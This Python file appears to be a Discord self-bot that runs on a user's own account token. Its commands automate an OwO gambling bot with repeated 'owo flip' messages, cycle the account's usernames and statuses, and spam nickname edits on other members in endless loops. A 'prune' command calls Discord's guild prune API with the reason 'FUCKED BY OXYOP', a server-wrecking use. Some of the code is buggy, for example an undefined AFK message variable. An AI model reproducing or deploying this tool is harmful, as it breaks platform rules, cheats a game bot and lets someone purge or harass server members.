import discord
from discord.ext import commands , tasks
import asyncio
import time
import json
import requests
from itertools import cycle
import random

Status = cycle(["OxyOp","MAGNUM OP ","I am oxy","Join magnum","Hm shadi ussi se krte jo salvar khushi se khole"])

"""
Choose what you want in your status - Under Quotes 
"""


usernames = ['firstUsername','Second','third','more...']

"""
Choose your username if you want to cycle your username and must enter password in "config.json"
"""

timetosleep = 3600 * 6

"""
choose how much time to delay between each usernames - 
default 7 hours - - Increase it by increasing that 6 
"""



bot = commands.Bot(command_prefix='o!',intents=discord.Intents.all(),self_bot = True)
cheat  = None
AFK = None
cycling = None
nick = None

with open('config.json','r') as x:
    config = json.load(x)


@bot.event
async def on_ready():
    print(f' Logged as {bot.user.name}#{bot.user.discriminator} \n Total guilds :- {len(bot.guilds)} \n Selfbot Version : 4 \n Created by https://github.com/oxy-Op ')
    
    change_status.start() 

@tasks.loop(seconds=60)
async def change_status():
    activityvar = discord.Activity(name=next(Status), type=random.randint(1,5))
    await bot.change_presence(activity=activityvar)


@bot.command()
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command()
async def changename(ctx):
    try:
        await ctx.send('Trying...')
        password = config['password']
        for name in usernames:
            await ctx.author.edit(password=password,username=name)
            await asyncio.sleep(timetosleep)
        
    except:
        print('Please Check Your Password and check username nickname must be 2 to 32 characters ')

@bot.command()
async def cheatowo(ctx,amount):
    try:
        await ctx.send('Starting Botting... To Stop Type o!stop owo')
        global cheat
        cheat = True
        while cheat:
            await ctx.send('owo flip {}'.format(amount))
            await asyncio.sleep(60)
    except:
        print('An Error Occured')

@cheatowo.error
async def err(ctx,error):
    if isinstance(error,commands.MissingRequiredArgument):
        await ctx.send(':x: Please Enter Amount To Flip ,NOTE :- It is a infinity process , you can stop it by o!stop owo')
        

@bot.command()
async def stop(ctx,mode):
    if mode == 'owo':
        global cheat
        cheat = False
        await ctx.send('Success')
    if mode == 'nick':
        global nick
        nick = False
        await ctx.send('Success')
    if mode == 'membernick':
        global cycling
        cycling = False
        await ctx.send('Success')
    if mode == "afk":
        global AFK
        AFK = False
        await ctx.author.edit(nick=ctx.author.name)

@stop.error
async def err(ctx,error):
    if isinstance(error,commands.MissingRequiredArgument):
        await ctx.send(':x: Please Enter Modes as an argument , Modes can be found using o!modes')


@bot.command()
async def modes(ctx):
    embed = discord.Embed(title="Modes",description=" \n owo -  stops cheatowo  \n nick = stops cyclenick \n membernick - stops meber cycle nick \n afk - stops afk",color=0xbee)
    await ctx.send(embed=embed)

@bot.command()
async def prune(ctx,guildid:int,days:int):
    try:
        headers = {
            'authorization':config['token']
        }
        json = {
            'days':days,
            'reason':'FUCKED BY OXYOP'
        }
        r = requests.post(f'https://discord.com/api/v9/guilds/{guildid}/prune',headers=headers,json=json)
        print(r.json())
        await ctx.send(r.json())
    except Exception as e:
        print("In Prune: ",e)

@prune.error
async def prerr(ctx,error):
    if isinstance(error,commands.MissingRequiredArgument):
        await ctx.send(':x: Please Enter Guild ID and Number of days to prune \n Example:- `o!prune 1234567890123 7`')
    if isinstance(error,commands.MissingPermissions):
        await ctx.send(':x: Permission is required for this process')
    if isinstance(error,commands.GuildNotFound):
        await ctx.send(':x: Guild not found')

@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.channel.DMChannel) and message.author != bot.user:
        await message.channel.send(msg)
    await bot.process_commands(message)

@bot.command()
async def setafk(ctx,*,message):
    try:
        global AFK
        AFK = True
        global msg
        msg = message
        await ctx.send(f'I set your afk {message}')
        await ctx.author.edit(nick="[AFK] " + str(ctx.author.name))
    except Exception as e:
        print(e)
        await ctx.send(':x: Check console ',delete_after=3)

@setafk.error
async def seterr(ctx,error):
    if isinstance(error,commands.MissingRequiredArgument):
        await ctx.send(":x: Missing Argument : Please Set Afk Message - \n Example: `o!setafk hello i am afk`")
    if isinstance(error,commands.MissingPermissions):
        await ctx.send(':x: Missing Permissions to change nickname',delete_after=4)

@bot.command()
async def info(ctx):
    embed = discord.Embed(title="Information About Me",color=0xeffaa)
    embed.add_field(name="Name",value=bot.user.name)
    embed.add_field(name="Created By ",value="MムǤͶUM ♛ OxyOp#9605")
    embed.add_field(name="Programming Language ",value="Python 3.8.8")
    embed.add_field(name="API Wrapper",value=f"discord.py {discord.__version__} - (97%)")
    embed.add_field(name="Support My Server",value="[Click Me](https://discord.gg/qzdgbMcbNh)")
    embed.set_thumbnail(url=bot.user.avatar_url)
    embed.set_footer(text="Requested by {}".format(ctx.author.name),icon_url=ctx.author.avatar_url)
    await ctx.send(embed=embed)

@bot.command()
async def cyclenick(ctx,*,text):
    global nick
    nick = True
    while nick:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)

@bot.command(
    pass_context=True)
async def cyclemember(ctx, member:discord.Member,*, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await member.edit(nick=name)

@cyclenick.error
async def nickerr(ctx,error):
    if isinstance(error,commands.MissingRequiredArgument):
        await ctx.send(":x: Please Enter name to animate \n Example:- `o!cyclenick My Name is Animating`")
    if isinstance(error,commands.MissingPermissions):
        await ctx.send(':x: I am Missing Permission to change nickname')

@cyclemember.error
async def nickerr(ctx,error):
    if isinstance(error,commands.MissingRequiredArgument):
        await ctx.send(":x: Please Enter name to animate \n Example:- `o!cyclenick My Name is Animating`")
    if isinstance(error,commands.MissingPermissions):
        await ctx.send(':x: I am Missing Permission to change nickname')

def run():
    token = config['token']
    bot.run(token,bot=False)

if __name__ == '__main__':
    run()